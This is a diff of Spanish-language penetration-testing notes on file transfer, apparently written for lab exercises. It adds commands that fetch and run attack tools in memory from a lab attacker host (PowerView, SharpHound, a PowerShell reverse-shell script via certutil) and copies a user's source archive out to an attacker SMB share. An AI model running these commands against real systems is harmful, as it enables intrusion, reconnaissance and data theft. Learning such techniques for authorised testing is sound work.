@@ -19,13 +19,13 @@ Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 ##### Método Fileless - DownloadString
 Para que sea fileless (ejecutarse directamtente sin descargar en memoria), podemos añadir `IEX` delante de la instrucción de descarga ó pasarselo como pipe (`COMANDO_A_EJECUTAR | IEX`)
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
-
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.116:8000/powerview.ps1')
 ```
+Esto carga directamente en memoria el módulo `PowerView` (a efectos prácticos tenemos las mismas funciones que al ejecutar `Import-Moudule PowerView.ps1`, aunque no tenemos el módulo cargado en memoria)
 ##### Invoke-WebRequest
 Más moderno que los anteriores, permite manejar encabezados, códigos de respueta y cuerpo de la respuesta, aunque es algo más lento
 ```powershell
-Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+Invoke-WebRequest http://10.10.14.116:8000/PowerView.ps1 -OutFile PowerView.ps1
 ```
 ###### Bypasear errores en la Invoke-WebRequest
 - Internet Explorer previene la descarga de archivos
@@ -125,7 +125,7 @@ echo <base64> | base64 -d -w 0 > hosts
 
 #### SMB
 ```powershell
-copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\share\
 ```
 En ocasiones, si Windows no encuentra el protocolo SMB disponible, intenta utilizar WebDAV  como alternativa en los puertos 80 ó 443
 
@@ -268,7 +268,7 @@ Crear archivo con usuarios autorizados para acceder al servidor
 ```bash
 sudo htpasswd -c /etc/wsgidav.password user1
 ```
-Ejecutar wsgidav especificcando el archiov de configuración
+Ejecutar wsgidav especificcando el archivo de configuración
 ```bash
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth-conf=/etc/wsgidav.password
 ```
@@ -439,3 +439,20 @@ cat < /dev/tcp/<ip_servidor>/4444 > archivo_recibido
 Este concepto es acuñado a los archivos que puede utilizar un atacante para realizar acciones que van más allá de su propósito general.
 Actualmente hay dos sitios web que recopilan información sobre los archivos binarios Living off the Land:
 - [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
+- [GTFOBins](https://gtfobins.github.io/)
+### Ejemplo de descarga de archivo en Windows con certutil
+```powershell
+certutil.exe -urlcache -split -f http://10.10.14.104:8000/Invoke-PowerShellTcp.ps1 C:\Windows\Temp\Invoke-PowerShellTcp.ps1  
+```
+---
+## Ejemplo de descarga y ejecución 
+### Fileless - ejemplo sharphound
+- El siguiente comando descarga el archivo **`SharpHound.exe`** y lo ejecuta en memoria sin escribirlo en el disco, utilizando el ensamblado .NET cargado dinámicamente.
+	```powershell
+		$SharpHoundBytes = (Invoke-WebRequest -Uri http://10.10.14.116:8000/SharpHound.exe -UseBasicParsing).Content 
+		$Assembly = [System.Reflection.Assembly]::Load($SharpHoundBytes) [SharpHound.Program]::Main(@('-c', 'All', '--zipfilename', 'ILFREIGHT'))
+	```
+	Esto es equivalente a tener sharphound.exe descargado y ejecutar lo siguiente: 
+	```powershell
+	.\SharpHound.exe -c All --zipfilename ILFREIGHT
+	```
